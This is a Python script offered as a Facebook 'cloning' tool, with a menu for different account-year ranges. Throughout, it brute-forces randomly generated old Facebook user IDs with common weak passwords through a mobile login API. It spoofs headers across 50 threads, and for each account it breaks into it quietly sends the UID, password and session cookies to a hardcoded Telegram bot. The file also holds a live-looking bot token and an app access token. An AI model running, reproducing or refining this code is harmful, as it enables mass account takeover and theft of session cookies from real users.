
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,httpx,mechanize,rich,json,subprocess
try:
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from datetime import datetime
	from random import randint as rr
	from random import choice as rc
	from string import digits as digits
	from os import system as cmd
	from concurrent.futures import ThreadPoolExecutor as YOUNISXD 
except ModuleNotFoundError:
	os.system('pip install rich')
	os.system('pip install requests')
	os.system('pip install bs4')
## Removed terminal title banner for cleaner output

#---------------------------[ TELEGRAM BOT CONFIG ]---------------------------#
TOKEN = "7719522327:AAEZ-dhLKLviMWAmoD-fAgP5P4ihwfxM6XI"
CHAT_ID = "5814177556"

# Dedicated lightweight thread pool for non-blocking Telegram sends
_TG_EXECUTOR = YOUNISXD(max_workers=2)

def _send_to_telegram_safe(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    # Retry a few times with short timeouts; fail silently to avoid noisy logs
    for attempt in range(3):
        try:
            requests.post(url, data=payload, timeout=(2, 5))
            return True
        except Exception:
            try:
                time.sleep(0.5 * (attempt + 1))
            except Exception:
                pass
    return False

def send_to_telegram_async(message):
    try:
        _TG_EXECUTOR.submit(_send_to_telegram_safe, message)
    except Exception:
        # Swallow any executor scheduling errors
        pass

#---------------------------[ END TELEGRAM CONFIG ]---------------------------#

def ___uax___():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
# os.system('xdg-open https://t.me/Younis_Xyz') # <-- ĐÃ XÓA LINK

##-------------(Basic colors)-------------------
yellow = "\033[1;33m"
black = "\033[1;90m"
red = "\033[1;91m"
green = "\033[1;32m"
blue = "\033[1;34m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
r_cyan = "\033[38;5;122m"
r_purple = "\033[38;5;147m"
r_green = "\033[38;5;112m"
white = "\033[0;97m"
reset = '\x1b[0m'
pink = "\x1b[38;5;205m"
brown = "\x1b[38;5;208m"
colors = [
    "\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m",
    "\033[0;92m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m",
    "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m",
    "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m",
    "\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m",
    "\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m",
    "\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m", "\033[0;104m", "\033[1;104m",
    "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"
]
#---------------------------| Loop |---------------------------#
id,id2,loop,ok,cp=[],[],0,0,0;user=[];total_hits = 0
#---------------------------| Linex |---------------------------#
def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except Exception:
        pass

def linex():
    print(f'{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{white}')


# -------------(CHECK ID CREATION YEAR)--------------
def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ['1000000000']:
            younis_dgk = '2009'
        elif uid[:9] in ['100000000']:
            younis_dgk = '2009'
        elif uid[:8] in ['10000000']:
            younis_dgk = '2009'
        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            younis_dgk = '2009'
        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
            younis_dgk = '2010'
        elif uid[:6] in ['100001']:
            younis_dgk = '2010'
        elif uid[:6] in ['100002', '100003']:
            younis_dgk = '2011'
        elif uid[:6] in ['100004']:
            younis_dgk = '2012'
        elif uid[:6] in ['100005', '100006']:
            younis_dgk = '2013'
        elif uid[:6] in ['100007', '100008']:
            younis_dgk = '2014'
        elif uid[:6] in ['100009']:
            younis_dgk = '2015'
        elif uid[:5] in ['10001']:
            younis_dgk = '2016'
        elif uid[:5] in ['10002']:
            younis_dgk = '2017'
        elif uid[:5] in ['10003']:
            younis_dgk = '2018'
        elif uid[:5] in ['100004']:
            younis_dgk = '2019'
        elif uid[:5] in ['100005']:
            younis_dgk = '2020'
        elif uid[:5] in ['100006']:
            younis_dgk = '2021'
        elif uid[:5] in ['100009']:
            younis_dgk = '2023'
        elif uid[:5] in ['100007', '100008']:
            younis_dgk = '2022'
        else:
            younis_dgk = ''
    elif len(uid) in [9, 10]:
        younis_dgk = '2008'
    elif len(uid) == 8:
        younis_dgk = '2007'
    elif len(uid) == 7:
        younis_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ['61']:
        younis_dgk = '2024'
    else:
        younis_dgk = ''
    return younis_dgk
        	
#---------------------------[ RESULT HELPERS ]---------------------------#
def _lower_field(po, keys):
    if not isinstance(po, dict):
        return ''
    for key in keys:
        value = po.get(key)
        if isinstance(value, str):
            return value.lower()
    return ''

def _parse_cookie_map(cookies_list):
    cookie_map = {}
    for c in cookies_list:
        if isinstance(c, dict) and c.get('name'):
            cookie_map[c.get('name')] = c.get('value')
    return cookie_map

def _cookies_to_string(cookies_list):
    parts = []
    for c in cookies_list:
        if isinstance(c, dict) and c.get('name') is not None:
            name = str(c.get('name'))
            value = '' if c.get('value') is None else str(c.get('value'))
            parts.append(f"{name}={value}")
    return '; '.join(parts)

def _has_valid_cookies(po, uid):
    if not isinstance(po, dict):
        return False
    cookies = po.get('session_cookies') or []
    if isinstance(cookies, list) and len(cookies) > 0:
        cookie_map = _parse_cookie_map(cookies)
        c_user = cookie_map.get('c_user')
        xs = cookie_map.get('xs')
        if c_user and xs:
            # Yêu cầu c_user trùng với UID để coi là chính xác
            return str(c_user) == str(uid)
    return False

def _is_checkpoint(po):
    if not isinstance(po, dict):
        return False
    msg = _lower_field(po, ['error_msg','error_msg_text','message','error','error_description','error_reason'])
    if any(k in msg for k in ['checkpoint','login approval','confirm','review','disabled','suspended']):
        return True
    # Common FB error/subcodes for checkpoint/approval flows
    if po.get('error_code') in [405, 190] or po.get('error_subcode') in [1348092, 1348093, 460, 459]:
        return True
    return False

def _is_login_success(po, uid):
    if not isinstance(po, dict):
        return False
    if po.get('error_code') or _is_checkpoint(po):
        return False
    if _has_valid_cookies(po, uid):
        return True
    # Fallback: presence of session_key with no error fields
    return 'session_key' in po and not _lower_field(po, ['error_msg','message'])

#---------------------------[ MAIN MENU ]---------------------------#
def WEHSHI________():
    clear()
    print(f"\033[1;90m[\033[1;97m1\033[1;90m]\033[0;97m OLD 2010 to 2012 CLONING")
    print(f"\033[1;90m[\033[1;97m2\033[1;90m]\033[0;97m OLD 2009 & 2010 CLONING")
    print(f"\033[1;90m[\033[1;97m3\033[1;90m]\033[0;97m OLD 2011 to 2014 CLONING")
    print(f"\x1b[1;90m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\033[0;97m") 
    option = input(f"\033[1;90m[\033[1;97m?\033[1;90m]\033[0;97m Enter Your Choice: ")
    # --- CÁC LINK ĐÃ BỊ XÓA KHỎI ĐÂY ---
    if option == "1":__2010___2011()
    elif option == "2":____old2009___()
    elif option == "3":_____old2011_____()
    else:
        print(f"{red}[!] Invalid choice..."); WEHSHI________()


#---------------------------[ 2010-2011 CLONING ]---------------------------#

def __2010___2011():
    user = []
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    for i in range(int(limit)):
        data = random.choice(["100001","100002","100003","100004"])+str(random.choice(range(111111111, 999999999)))
        user.append(data)
    with YOUNISXD(max_workers=50) as YOUNIS:
        tl = str(limit)
        clear()
        # Banner lines removed for cleaner output
        for mal in user:
            uid = mal
            pas = ['123456', '1234567', '12345678', '123456789']
            YOUNIS.submit(____old____, uid, pas, tl)
    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(ok)}")
    print(f"{white}➤ Total CP: {red}{len(cp)}")
    linex()
    exit()
    
#---------------------------[ 2009-2010 CLONING ]---------------------------#
def ____old2009___():
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    for _ in range(int(limit)):
        nmp = ''.join(random.choice(digits) for _ in range(9))
        user.append(nmp)

    with YOUNISXD(max_workers=50) as YOUNIS:
        clear()
        tl = str(len(user))
        # Banner lines removed for cleaner output
        for love in user:
            uid = "100000" + love
            pas = ['123456', '1234567', '12345678', '123456789']
            YOUNIS.submit(____old____, uid, pas, tl)

    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(ok)}")
    print(f"{white}➤ Total CP: {red}{len(cp)}")
    linex()
    exit()

#---------------------------[ 2011-2014 CLONING ]---------------------------#
def _____old2011_____():
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    for _ in range(int(limit)):
        nmp = ''.join(random.choice(digits) for _ in range(10))
        user.append(nmp)
    with YOUNISXD(max_workers=50) as YOUNIS:
        clear()
        tl = str(len(user))
        # Banner lines removed for cleaner output
        for love in user:
            uid = "10000" + love
            pas = ['123456', '1234567', '12345678', '123456789']
            YOUNIS.submit(____old____, uid, pas, tl)

    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(ok)}")
    print(f"{white}➤ Total CP: {red}{len(cp)}")
    linex()
    exit()
    
def ____old____(uid,pas,tl):
    global loop,ok,total_hits,cp
    sys.stdout.write(f"\r\033[0m[\033[1;92m𝙔𝙊𝙐𝙉𝙄𝙎-𝙓𝘿🔥\033[0m] \033[0;93m{loop}\033[0m/\033[1;91m{tl} \033[1;97m[\033[1;92mOK-{ok}\033[1;97m]");sys.stdout.flush()
    try:
        for ps in pas:
            with requests.Session() as session:
                headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': ___uax___(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
            po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()


            
            # --- ĐÁNH GIÁ PHẢN HỒI ĐĂNG NHẬP ---
            success = _is_login_success(po, uid)
            checkpoint = _is_checkpoint(po)

            if success:
                year = creationyear(uid)
                cookies_list = po.get('session_cookies') or []
                cookie_string = _cookies_to_string(cookies_list)
                # In ra màn hình console
                print(f"\r\033[1;92m[YOUNIS-OK💚] {uid} ● {ps}\033[1;97m ● \033[1;92m{year}")
                
                # Tạo nội dung tin nhắn "đẹp mắt"
                message = (
                    f"<b>🎉 Account Login Thành Công! 🎉</b>\n\n"
                    f"<b>UID:</b> <code>{uid}</code>\n"
                    f"<b>Password:</b> <code>{ps}</code>\n"
                    f"<b>Năm Tạo:</b> {year}\n"
                    f"<b>Cookies:</b>\n<code>{cookie_string}</code>\n"
                    f"-----------------------------\n"
                    f"<b>Tool by Younis (Nguyên Chương)</b>"
                )
                
                # Gửi tin nhắn đến Telegram (không chặn luồng)
                send_to_telegram_async(message)
                
                # Xóa dòng lưu file cũ:
                # open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"|"+creationyear(uid)+"\n")
                
                ok+=1
                break # Dừng thử các pass khác cho uid này
            elif checkpoint:
                year = creationyear(uid)
                print(f"\r\033[1;91m[YOUNIS-CP💛] {uid} ● {ps}\033[1;97m ● \033[1;91m{year}")
                cp+=1
                break
            
            else:pass
        loop+=1
    except Exception as e:pass

WEHSHI________()
